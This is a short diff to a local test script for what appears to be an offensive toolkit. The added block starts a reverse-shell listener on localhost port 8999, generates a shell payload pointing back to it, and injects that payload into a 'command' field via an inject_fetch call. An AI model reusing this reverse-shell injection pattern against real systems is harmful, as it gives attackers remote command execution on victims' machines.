@@ -2,7 +2,7 @@
 
 # local tests
 
-from payloads import Monkey
+from payloads import Monkey, Generator
 
 from server import ReverseListener
 
@@ -62,7 +62,24 @@ print(res)
 
 listener.stop()
 
-print('----------------custom:')
+print('----------------shell:')
+
+ip = "127.0.0.1"
+port = 8999
+
+listener = ReverseListener(ip, port, once=True, cb=lambda: 'ls')
+
+listener.start()
+
+payload = Generator.shell(lhost=ip, lport=port, s='sh')
+print(payload)
+
+res = monkey.inject_fetch({ 'command': payload })
+print(res)
+
+listener.stop()
+
+print('----------------binary:')
 
 print('todo')
 
